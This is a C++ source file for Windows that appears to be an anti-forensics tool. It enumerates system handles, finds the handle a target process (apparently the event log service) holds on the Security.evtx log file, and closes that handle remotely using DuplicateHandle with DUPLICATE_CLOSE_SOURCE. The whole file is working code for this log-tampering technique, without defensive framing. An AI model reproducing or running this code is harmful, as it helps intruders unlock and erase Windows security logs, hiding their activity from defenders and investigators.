#include "stdafx.h"
#include "GetFileHandle.h"


LPVOID fn_get_system_handle() {

	ULONG uInfoSize = 0x10000;
	NTSTATUS status = 0;
	LPVOID lpBuffer;

	NtQuerySystemInformation pfnNtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (pfnNtQuerySystemInformation == NULL)
		return NULL;


	do {
		lpBuffer = HeapAlloc(GetProcessHeap(), 0, uInfoSize);
		if (lpBuffer == NULL)
			return NULL;

		status = pfnNtQuerySystemInformation(SystemHandleInformation, lpBuffer, uInfoSize, NULL);
		if (status == STATUS_INFO_LENGTH_MISMATCH) {

			HeapFree(GetProcessHeap(), 0, lpBuffer);
			uInfoSize *= 2;
		}
	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	if (NT_SUCCESS(status) && lpBuffer) {
		return lpBuffer;
	}

	HeapFree(GetProcessHeap(), 0, lpBuffer);
	return NULL;

}


DWORD WINAPI fn_get_filename_threadproc(LPVOID lpParam) {


	IO_STATUS_BLOCK io_status;
	HANDLE hFile = *(LPHANDLE)lpParam;
	LPVOID lpBuffer = (LPVOID)((CHAR*)lpParam + sizeof(HANDLE));


	NtQueryInformationFile pfnNtQueryInformationFile = (NtQueryInformationFile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationFile");
	if (pfnNtQueryInformationFile == NULL)
		return FALSE;


	pfnNtQueryInformationFile(hFile, &io_status, lpBuffer, MAX_PATH, FileNameInformation);
	return 0;

}


BOOL fn_get_filename_byhandle(HANDLE hFile, LPSTR lpAscStr) {

	LPVOID lpBuffer = NULL;
	HANDLE hThread = NULL;
	DWORD dwRet = NULL;
	PFILE_NAME_INFORMATION pFileNameInfo = NULL;

	__try {

		lpBuffer = HeapAlloc(GetProcessHeap(), 0, MAX_PATH);
		*((LPHANDLE)lpBuffer) = hFile;

		hThread = CreateThread(NULL, NULL, fn_get_filename_threadproc, lpBuffer, NULL, NULL);
		dwRet = WaitForSingleObject(hThread, 1000);

		if (dwRet == WAIT_TIMEOUT)
			return FALSE;

		pFileNameInfo = (PFILE_NAME_INFORMATION)((CHAR*)lpBuffer + sizeof(HANDLE));
		WideCharToMultiByte(CP_ACP, 0, pFileNameInfo->FileName, pFileNameInfo->FileNameLength / 2, lpAscStr, MAX_PATH, NULL, NULL);

		return TRUE;
	}
	__finally {
		CloseHandle(hThread);
		HeapFree(GetProcessHeap(), 0, lpBuffer);
	}

}



HANDLE fn_trav_proc_handle(DWORD dwProcessId) {


	HANDLE hFile = NULL;
	HANDLE hProcess = NULL;
	HANDLE hDupTarget = NULL;
	BOOL bRet = FALSE;
	BYTE bCurrentObjectTypeNumber = NULL;
	PSYSTEM_HANDLE_INFORMATION psHandleInfo = NULL;
	SYSTEM_HANDLE psHandle;
	LPSTR lpAscStr = new CHAR[MAX_PATH];


	hFile = CreateFile(L"NUL", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	psHandleInfo = (PSYSTEM_HANDLE_INFORMATION)fn_get_system_handle();
	if (psHandleInfo == NULL)
		return FALSE;


	for (INT i = 0; i <= psHandleInfo->HandleCount; i++) {

		psHandle = psHandleInfo->Handles[i];
		if (psHandle.ProcessId != GetCurrentProcessId())
			continue;
		if (psHandle.Handle == (USHORT)hFile) {
			bCurrentObjectTypeNumber = psHandle.ObjectTypeNumber; // current system version file handle object type number
			break;
		}
	}

	wcout << "[+] current system version file objectTypeNumber : 0x" << hex << psHandle.ObjectTypeNumber << endl;
	for (INT i = 0; i <= psHandleInfo->HandleCount; i++) {

		psHandle = psHandleInfo->Handles[i];
		if (psHandle.ProcessId != dwProcessId)
			continue;

		if (psHandle.ObjectTypeNumber != bCurrentObjectTypeNumber)
			continue;


		hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, psHandle.ProcessId);
		if (hProcess == NULL) {
			cout << "[!] Open target process failure. please check priv" << endl;
			continue;
		}
		bRet = DuplicateHandle(hProcess, (HANDLE)psHandle.Handle, GetCurrentProcess(), &hDupTarget, NULL, NULL, DUPLICATE_SAME_ACCESS);
		if (!bRet) {
			cout << "[!] duplicate handle failure" << endl;
			CloseHandle(hProcess);
			continue;
		}


		ZeroMemory(lpAscStr, MAX_PATH);  // clean dirty data
		bRet = fn_get_filename_byhandle(hDupTarget, lpAscStr);
		if (!bRet)
			return FALSE;


		string stl_str(lpAscStr);
		string::size_type posi;
		transform(stl_str.begin(), stl_str.end(), stl_str.begin(), tolower);
		posi = stl_str.find("\\security.evtx");
		if (posi != stl_str.npos) {
			//cout << lpAscStr << endl;

			bRet = DuplicateHandle(hProcess, (HANDLE)psHandle.Handle, GetCurrentProcess(), &hDupTarget, NULL, FALSE, DUPLICATE_CLOSE_SOURCE);
			CloseHandle(hDupTarget);

			if (bRet == 0)
				return ((HANDLE)psHandle.Handle);
			else
				return (HANDLE)1;

		}



		CloseHandle(hDupTarget);
		CloseHandle(hProcess);
	}


	CloseHandle(hFile);
	HeapFree(GetProcessHeap(), 0, psHandleInfo);

}

